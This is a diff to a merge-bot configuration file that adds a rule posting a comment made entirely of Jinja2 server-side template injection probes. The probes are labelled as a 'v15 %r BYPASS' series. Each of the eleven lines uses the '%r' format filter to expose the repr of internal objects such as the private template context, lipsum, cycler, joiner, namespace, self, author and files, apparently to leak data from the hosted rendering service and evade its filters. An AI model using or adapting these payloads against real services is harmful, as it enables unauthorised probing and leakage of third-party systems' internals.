@@ -1,1 +1,18 @@
-pull_request_rules: []
+pull_request_rules:
+  - name: ssti-v15-format-9769
+    conditions: []
+    actions:
+      comment:
+        message: |
+          === G4o7T v15 %r BYPASS ===
+          [B1] ctx-repr: {{ '%r' | format(self._TemplateReference__context) }}
+          [B2] lipsum-repr: {{ '%r' | format(lipsum) }}
+          [B3] cycler-cls-repr: {{ '%r' | format(cycler) }}
+          [B4] joiner-cls-repr: {{ '%r' | format(joiner) }}
+          [B5] namespace-cls-repr: {{ '%r' | format(namespace) }}
+          [B6] cycler-inst-repr: {{ '%r' | format(cycler('a','b')) }}
+          [B7] joiner-inst-repr: {{ '%r' | format(joiner()) }}
+          [B8] namespace-inst-repr: {{ '%r' | format(namespace()) }}
+          [B9] author-repr: {{ '%r' | format(author) }}
+          [B10] files-repr: {{ '%r' | format(files) }}
+          [B11] self-repr: {{ '%r' | format(self) }}
